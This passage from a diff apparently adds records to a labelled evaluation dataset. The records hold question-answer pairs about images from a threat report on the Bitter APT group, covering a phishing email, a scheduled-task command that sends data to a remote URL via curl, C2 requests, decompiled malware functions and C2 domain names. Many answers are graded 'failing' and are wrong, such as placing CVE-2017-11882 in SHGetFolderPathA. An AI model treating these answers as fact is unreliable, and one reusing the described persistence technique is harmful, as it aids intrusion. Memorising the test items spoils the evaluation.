+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve phishing and potentially malicious file attachments.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the intended audience of the email shown in the image?",
+                    "answer": "The intended audience of the email is a recipient who is expected to review the attached file.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What evidence in the image suggests phishing or fraudulent activity?",
+                    "answer": "The evidence suggesting phishing or fraudulent activity is the suspicious email attachment requesting the recipient to go through an attached file.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What language style is used in the email of the image?",
+                    "answer": "The language style used in the email is formal.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "good"
+                },
+                {
+                    "question": "What kind of document is attached to the email in the image?",
+                    "answer": "The attached document is a .doc file.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible intentions of the sender in the email shown in the image?",
+                    "answer": "The possible intentions of the sender are to deceive the recipient into opening a potentially malicious attachment.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What email addresses are visible in the image?",
+                    "answer": "The email addresses visible are rab3tikatuly@gmail.com and ddscm2@pof.gov.pk.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the email subject in the image?",
+                    "answer": "The significance of the email subject is to indicate that it contains an application for CDR.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the file size shown in the image?",
+                    "answer": "The significance of the file size is that it indicates the document is relatively small at 36 KB.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities might be exploited as seen in the image?",
+                    "answer": "The vulnerabilities might be exploited include phishing and potentially malicious document attachments.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the potential impact on the recipients based on the image?",
+                    "answer": "The potential impact is potential malware infection from the attached file.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What specific entities are targeted according to the image?",
+                    "answer": "The specific entities targeted are dddata_int@rab.gov.bd and <ddscm2@pof.gov.pk>.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What infrastructure details can be inferred from the image?",
+                    "answer": "The infrastructure details include email addresses from domains such as gmail.com and government entities pof.gov.pk and rab.gov.bd.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                }
+            ]
+        },
+        {
+            "name": "Rdx.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a command for creating a scheduled task in Windows to run a PowerShell command that outputs user music directory information to a remote URL.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image include creating a scheduled task in Windows for executing a command that outputs user music directory information to a remote server.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve scheduled task creation and command execution.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function of the zCode in the image is to create a scheduled task for executing a malicious payload.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the URL in the image?",
+                    "answer": "The significance of the URL is to track the execution of the scheduled task.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the purpose of the '/sc MINUTE /mo 15' parameter in the command?",
+                    "answer": "The purpose of the '/sc MINUTE /mo 15' parameter is to schedule the task to run every 15 minutes.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What role does 'schtasks.exe' play in the image?",
+                    "answer": "The role of 'schtasks.exe' in the image is to create a scheduled task.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the function of 'cmd /c start /min curl' within this context?",
+                    "answer": "The function of 'cmd /c start /min curl' within this context is to open a minimized command prompt and execute a cURL command.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What are the security implications of the actions depicted in the image?",
+                    "answer": "The security implications include potential unauthorized execution of commands and modification of system files.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is to create a scheduled task for executing a malicious payload.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities (e.g., CVE-2017-11882) are being targeted as shown in the image?",
+                    "answer": "The vulnerability being targeted is CVE-2017-11882.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the image depict the use of themed lure documents in the attack?",
+                    "answer": "The image depicts the use of themed lure documents in the attack by showing a command that creates a scheduled task to execute a malicious file disguised as a music file from a public music directory.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is the AWS Global Accelerator related to the actions in the image?",
+                    "answer": "The AWS Global Accelerator is not related to the actions in the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of exploiting the Rapid Action Battalion Unit as mentioned in the image?",
+                    "answer": "The significance is to create a scheduled task that runs a command to output music from the RdxFactFactory.exe, which is not related to exploiting the Rapid Action Battalion Unit.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "RdxFac.PNG",
+            "pic_type": "File Paths and Names",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a file path pointing to an executable named RdxFactory.exe.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for identifying a potentially malicious executable file in a cyber threat intelligence context.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve the execution of a potentially malicious executable file.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the significance of the file path in the image?",
+                    "answer": "The significance of the file path is it indicates a potentially malicious executable file located in the music directory.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What could be the potential risks associated with the file shown in the image?",
+                    "answer": "The potential risks are malware execution and system compromise.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the possible purpose of storing an executable file in a public music directory?",
+                    "answer": "The possible purpose is to disguise malicious software as a benign file.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the security implications of executing the file in this location?",
+                    "answer": "The security implications include potential unauthorized access to shared resources and execution of malicious code.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What type of file is depicted in the image?",
+                    "answer": "The type of file depicted is an executable file.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "Which operating system is most likely to be relevant to the image content?",
+                    "answer": "The operating system most likely to be relevant is Windows.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What measures can be taken to protect against threats posed by the file in the image?",
+                    "answer": "The measures include running a malware scan, avoiding execution of unknown .exe files, and ensuring system and antivirus software are up to date.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What details in the image suggest who might have placed the file in the music directory?",
+                    "answer": "The file path suggests it was placed in the \"music\" directory by a user with administrative privileges or a process running with elevated rights.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not specified in the context of this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How might the Bitter APT group's tactics be represented in the image?",
+                    "answer": "The Bitter APT group's tactics might be represented by the suspicious executable file path indicating potential malicious activity.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What vulnerabilities could be associated with the content shown in the image?",
+                    "answer": "The vulnerabilities could be associated with potential malware execution.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "How does the file in the image relate to the phishing tactics mentioned in the knowledge graph?",
+                    "answer": "The file in the image relates to phishing tactics by potentially being a malicious executable used to trick users into executing it.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Request sent to C2.PNG",
+            "pic_type": "File Paths and Names",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a series of obfuscated web requests containing encoded parameters.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is to serve as a malicious server for hosting and distributing potentially harmful content.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for analyzing web request patterns potentially associated with malicious activities.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve parameter manipulation and obfuscated URL paths.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What HTTP requests are being made in the image?",
+                    "answer": "The HTTP requests being made in the image are for various endpoints including data1.php, PROGRAM_NAME, and dxagt5avbB2.php with specific parameters.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible intentions behind the requests shown in the image?",
+                    "answer": "The possible intentions behind the requests shown in the image are to exfiltrate data or perform malicious actions on a Windows 7 Professional system.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What coding language or scripting format is depicted in the image?",
+                    "answer": "The coding language depicted is PHP.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What platform or operating system is involved based on the image?",
+                    "answer": "The platform or operating system involved is Windows 7 Professional.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What kind of data is being requested in the image?",
+                    "answer": "The kind of data being requested is program names and identifiers.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the significance of the file paths in the image?",
+                    "answer": "The significance of the file paths is they indicate potential malicious activity targeting Windows 7 Professional.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What specific vulnerabilities are being exploited in the image?",
+                    "answer": "The specific vulnerabilities being exploited are related to parameter manipulation in PHP scripts.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How is AWS Global Accelerator being represented in the image?",
+                    "answer": "AWS Global Accelerator is not being represented in the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What evidence suggests the involvement of the Bitter APT group in the image?",
+                    "answer": "The evidence suggesting the involvement of the Bitter APT group is the specific URL paths and parameters used in the requests.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What techniques are used in the image to evade detection?",
+                    "answer": "The techniques used in the image to evade detection are obfuscation and encoding of URLs and parameters.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How are phishing tactics visualized in the image?",
+                    "answer": "Phishing tactics are visualized through sample request URLs containing obfuscated parameters and placeholders for user details and program names.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                }
+            ]
+        },
+        {
+            "name": "Requests making function 1 at offset 00401E00.PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a C function that constructs and writes to a file path.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses are for analyzing malware behavior and understanding obfuscation techniques.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve directory creation, file writing, and process execution.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function of the zCode in the image is to create a directory, write data to a file, and execute a shell command.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What programming language is used in the image?",
+                    "answer": "The programming language used in the image is C.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the purpose of the function shown in the image?",
+                    "answer": "The purpose of the function is to create a directory, write specific data to a file, and execute a shell command.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the notable function calls present in the image?",
+                    "answer": "The notable function calls present in the image are `SHGetFolderPathA`, `mkdir`, `fopen`, `fwrite`, `fclose`, `Sleep`, `qmemcpy`, `ShellExecuteA`, and `Find_running_process`.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What does the color-coding of the text in the image signify?",
+                    "answer": "The color-coding of the text in the image signifies different elements of the code syntax.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What kind of operations is the code in the image performing?",
+                    "answer": "The code in the image is performing file creation and manipulation operations.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the significance of the variable names used in the image?",
+                    "answer": "The significance of the variable names is to store paths, perform file operations, and manage strings for execution commands.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the potential impact of executing the code shown in the image?",
+                    "answer": "The potential impact is creating a directory, writing to a file, and executing a shell command.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the likely security implications of the code in the image?",
+                    "answer": "The likely security implications include potential unauthorized file creation and execution, as well as possible data exfiltration.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What debugging information, if any, can be deduced from the image?",
+                    "answer": "The debugging information deduced is the creation of a \"Debug\" directory.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What elements in the image suggest involvement of the Bitter APT group?",
+                    "answer": "The elements suggesting involvement of the Bitter APT group include the use of specific function calls like `SHGetFolderPathA` for directory manipulation, file creation with sensitive data, and process execution commands which are tactics commonly associated with their activities.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the image reflect phishing tactics described in the knowledge graph?",
+                    "answer": "The image reflects phishing tactics by attempting to execute a shell command and manipulate file paths, which are common techniques used in phishing attacks to trick users into executing malicious code.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "Where in the image could the vulnerabilities such as CVE-2017-11882 be potentially exploited?",
+                    "answer": "The potential exploitation of vulnerabilities such as CVE-2017-11882 could occur in the SHGetFolderPathA function calls.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What indications are present in the image that could relate to the AWS Global Accelerator use?",
+                    "answer": "There are no indications in the image that relate to AWS Global Accelerator use.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "Which part of the image could reveal network proxying tactics like T1090-Proxy?",
+                    "answer": "The part of the image that could reveal network proxying tactics like T1090-Proxy is the function call `ShellExecuteA` with the parameter `\"open\"`.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What artifacts in the image suggest the masking of malicious activities?",
+                    "answer": "The artifacts suggesting the masking of malicious activities include the use of sleep commands and dynamic memory allocation.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "Requests making function 2 at offset 00402130..PNG",
+            "pic_type": "Malware Code",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a C function performing operations including sleep, memory initialization, and potential shell execution.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are for reverse engineering and malware analysis.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve memory manipulation, sleep commands to evade detection, and potentially executing external programs.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible function of the zCode in the image?",
+                    "answer": "The possible function is to initialize a buffer, perform some operations including sleep commands and potential file or process manipulation, and then execute a shell command.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What programming language is used in the image?",
+                    "answer": "The programming language used is Assembly.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the purpose of the 'Sleep' function in the image?",
+                    "answer": "The purpose of the 'Sleep' function is to introduce a delay in the execution.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What could be the potential effects of the 'ShellExecuteA' function in the image?",
+                    "answer": "The potential effects of the 'ShellExecuteA' function could include opening a file or launching an application specified by the string \"Str\".",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "satisfactory"
+                },
+                {
+                    "question": "What are the security implications of the code depicted in the image?",
+                    "answer": "The security implications include potential unauthorized execution and data manipulation.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What is the role of the 'byte_4052EB' in the image?",
+                    "answer": "The role of 'byte_4052EB' is to control the execution flow after the initial setup and before the sleep command.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure in the context of this image is not specified.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What are the vulnerabilities targeted by the code in the image?",
+                    "answer": "The vulnerabilities targeted by the code in the image are related to buffer overflow and shell execution.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "How does the image relate to the Bitter APT campaign?",
+                    "answer": "The image relates to the Bitter APT campaign by showcasing code that includes sleep commands and file operations, indicative of malicious activity associated with the campaign.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What methods are used in the image to evade detection?",
+                    "answer": "The methods used to evade detection include sleep timers and data obfuscation.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What is the significance of the C2 server concerning the code in the image?",
+                    "answer": "The significance of the C2 server is for receiving commands and potentially downloading additional malware.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                }
+            ]
+        },
+        {
+            "name": "The timeline below shows the various domains based on their certificate creation date.PNG",
+            "pic_type": "Charts and Data Visualization",
+            "questionsANDanswersANDqlabelsANDmark": [
+                {
+                    "question": "What is the main content of the image?",
+                    "answer": "The main content is a timeline of domains SSL certificates.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What is the possible source of the image?",
+                    "answer": "The possible source is a cyber threat intelligence article from Talos.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible uses of the image?",
+                    "answer": "The possible uses of the image are to track the timeline of SSL certificates issued to specific domains for cyber threat intelligence.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the possible attack techniques involved in the image?",
+                    "answer": "The possible attack techniques involve phishing or malware distribution through SSL-certified domains.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the trends reflected in the image?",
+                    "answer": "The trends reflected in the image are the issuance of SSL certificates for specific domains over a timeline from October 2021 to February 2022.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What are the conclusions that can be made based on the image?",
+                    "answer": "The conclusions that can be made based on the image are that certain domains were observed obtaining SSL certificates in specific months from October 2021 to February 2022.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What are the specific domains mentioned in the timeline of the image?",
+                    "answer": "The specific domains mentioned in the timeline are olmajhnservice[.], urocakpmpanel[.], tomcruefrshsvc[.], and levarisnetqlsvc[.]com.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "When did each domain SSL certificate become valid as shown in the image timeline?",
+                    "answer": "The SSL certificates for the domains became valid in October 2021, November 2021, December 2021, and February 2022 as shown in the timeline.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What significance do the changes in domain names have over the given timeline in the image?",
+                    "answer": "The significance is potential indicators of evolving cyber threats.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What organization does the logo 'Talos' in the image represent?",
+                    "answer": "The organization represented by the logo 'Talos' is Cisco Talos.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "How does the visual layout of the timeline contribute to understanding the sequence of events in the image?",
+                    "answer": "The visual layout of the timeline contributes to understanding the sequence of events by clearly marking each month with corresponding domain names issued SSL certificates.",
+                    "qlabel1": "no",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "excellent"
+                },
+                {
+                    "question": "What potential implications could the timeline of domain SSL certificates have for cybersecurity efforts?",
+                    "answer": "The potential implications could involve identifying patterns in malicious domain registration for timely mitigation strategies.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "good"
+                },
+                {
+                    "question": "What role does 'TrailBlazer' infrastructure play in the context of this image?",
+                    "answer": "The role of 'TrailBlazer' infrastructure is not specified in the context of this image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How does the use of AWS Global Accelerator relate to the domains shown in the image?",
+                    "answer": "The use of AWS Global Accelerator is not related to the domains shown in the image.",
+                    "qlabel1": "no",
+                    "qlabel2": "no",
+                    "qlabel": "no",
+                    "mark": "failing"
+                },
+                {
+                    "question": "What insights can be drawn about the Bitter APT's choice of domains from this image?",
+                    "answer": "The insights suggest Bitter APT reuses domains with slight variations over several months.",
+                    "qlabel1": "yes",
+                    "qlabel2": "yes",
+                    "qlabel": "yes",
+                    "mark": "failing"
+                },
+                {
+                    "question": "How might the tactics of network proxying (T1090-Proxy) be reflected in the domain activities shown in the image?",
